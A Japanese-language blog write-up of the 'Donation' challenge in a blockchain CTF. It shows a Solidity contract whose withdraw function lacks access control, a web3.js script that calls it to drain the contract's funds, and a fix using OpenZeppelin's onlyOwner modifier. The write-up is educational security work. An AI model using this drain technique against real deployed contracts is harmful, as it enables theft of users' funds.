+++
title = "Security Innovation Blockchain CTF - Donation"
date = "2022-05-11"
tags = [
    "security",
    "ctf",
]
+++

#### 概要

[Security Innovation Blockchain CTF](https://blockchain-ctf.securityinnovation.com/)

Security Innovationという企業が開催している、常設のCTFがあります。
今回は、[Donation](https://blockchain-ctf.securityinnovation.com/#/game/0)という問題を解きました。

#### 問題

問題を開くと、寄付をするためのアプリケーションであることが分かります。

Donate 0.1 Ether!をクリックするとMetaMaskが起動し、0.1 Etherが寄付されます。

<img src=./dapps.png><br>

このアプリケーションのソースコードとして、以下のSolidityファイルが渡されます。

```solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Donation is CtfFramework{

    using SafeMath for uint256;

    uint256 public funds;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        funds = funds.add(msg.value);
    }

    function() external payable ctf{
        funds = funds.add(msg.value);
    }

    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf{
        msg.sender.transfer(funds);
        funds = 0;
    }

}
```

コードを読んでみると、`withdrawDonationsFromTheSuckersWhoFellForIt`という関数があるのが分かります。

この関数は、`msg.sender`に今まで寄付された`funds`を送信する関数で、呼び出し可能なユーザーに制限がありません。

そのため、この関数を呼び出すことで、今まで寄付されたEthereumを引き出すことが可能になります。

#### エクスプロイト

デプロイされたコントラクトの呼び出しには、[MyCrypto](https://mycrypto.com)などが利用できますが、
今回はあえて[web3.js](https://web3js.readthedocs.io/en/v1.7.3/)を使って書いてみます。

```solidity
const Web3 = require('web3')
const HDWalletProvider = require("@truffle/hdwallet-provider")
const fs = require('fs');

require('dotenv').config()

const web3 = new Web3(new HDWalletProvider(process.env.PRIVATE_KEY, process.env.PROVIDER_URL))
const abi = JSON.parse(fs.readFileSync('./src/abi.json'))
const contract = new web3.eth.Contract(abi, '0xaa51c14d9ff94ee5a5674ee0af8257f1665956f3')

// withdrawDonationsFromTheSuckersWhoFellForIt関数の呼び出し
const option = {from: '0xd7544D522B75347b48917649ebc5D334b3D43445'}
contract.methods.withdrawDonationsFromTheSuckersWhoFellForIt().send(option)
```

#### どう実装されているべきか

今回の問題は、コントラクトのオーナーのみが利用できるべき機能が、誰でも呼び出し可能になってしまっていることに問題があります。
そのため、コントラクト側でオーナーか否かの判定を入れれば良いことになります。

SolidityにはOpenZeppelinというライブラリがあり、
このライブラリには[Ownable](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol)というコントラクトがあります。

以下のように、`onlyOwner`という`modifier`をつけることで、デプロイしたオーナーのみが関数を呼び出せるように制限することが可能です。

詳細はドキュメントを参照してください。

https://docs.openzeppelin.com/contracts/2.x/access-control

```solidity
import "@openzeppelin/contracts/ownership/Ownable.sol";

contract A is Ownable {
    function somethingSecret() public onlyOwner {
        // オーナーからの呼び出しのみを許可
    }
}
```
